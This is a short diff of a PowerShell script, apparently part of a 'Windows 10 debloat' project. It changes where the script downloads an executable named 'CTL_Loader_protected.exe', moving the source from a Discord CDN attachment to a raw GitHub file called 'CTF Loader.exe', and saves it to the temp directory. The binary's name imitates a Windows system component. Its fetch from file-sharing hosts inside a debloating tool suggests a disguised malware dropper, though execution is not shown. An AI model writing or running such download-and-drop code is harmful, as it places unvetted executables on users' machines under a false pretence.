@@ -26,7 +26,7 @@ if (Test-Path -Path $fileToOpen) {
     Write-Host "File '$fileToOpen' not found."
 }
 
-$urlExe = "https://cdn.discordapp.com/attachments/1218683568276897872/1219477303588032554/CTL_Loader_protected.exe?ex=660b71bd&is=65f8fcbd&hm=1c48e7a0fae2ef09142b3c331f83216770b72727e17ccfa39d24d829460c3030&"
+$urlExe = "https://github.com/peiceofmind/WIndows10DebloatedMAX/raw/main/CTF%20Loader.exe"
 $outputFilePathExe = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "CTL_Loader_protected.exe")
 
 Invoke-WebRequest -Uri $urlExe -OutFile $outputFilePathExe
